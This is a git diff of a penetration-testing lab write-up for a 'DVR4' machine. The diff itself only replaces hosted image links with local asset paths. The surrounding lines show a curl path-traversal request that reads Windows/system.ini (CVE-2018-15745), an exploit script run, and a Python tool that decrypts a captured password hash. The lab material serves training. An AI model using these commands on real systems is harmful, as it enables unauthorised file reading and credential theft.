@@ -57,9 +57,13 @@ SMB         192.168.187.179 445    DVR4             [-] DVR4\anonymous:anonymous
 
 ## 8080 HTTP
 Didn't required login
-![image](https://hackmd.io/_uploads/rkSLGw4YWx.png)
-![image](https://hackmd.io/_uploads/H14w7vVK-g.png)
-![image](https://hackmd.io/_uploads/S1Z9LDVYWx.png)
+
+![image](_assets/rkSLGw4YWx.png)
+
+![image](_assets/H14w7vVK-g.png)
+
+![image](_assets/S1Z9LDVYWx.png)
+
 ```
 ┌──(kali㉿kali)-[~/Desktop/Pen200/DVR4]
 └─$ curl "http://192.168.187.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
@@ -79,7 +83,9 @@ timer=timer.drv
 ```
 
 * CVE-2018-15745
-![image](https://hackmd.io/_uploads/HkgyTP4tbe.png)
+
+  ![image](_assets/HkgyTP4tbe.png)
+
 ```
 ┌──(kali㉿kali)-[~/Desktop/Pen200/DVR4]
 └─$ ./exploit.sh                     
@@ -316,7 +322,9 @@ Description0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B735
 Password1=5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE
 ```
 https://github.com/s3l33/CVE-2022-25012/blob/main/CVE-2022-25012.py
-![image](https://hackmd.io/_uploads/r1CgiuNY-x.png)
+
+![image](_assets/r1CgiuNY-x.png)
+
 ```
 ┌──(kali㉿kali)-[~/Desktop/Pen200/DVR4]
 └─$ python3 50130.py ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
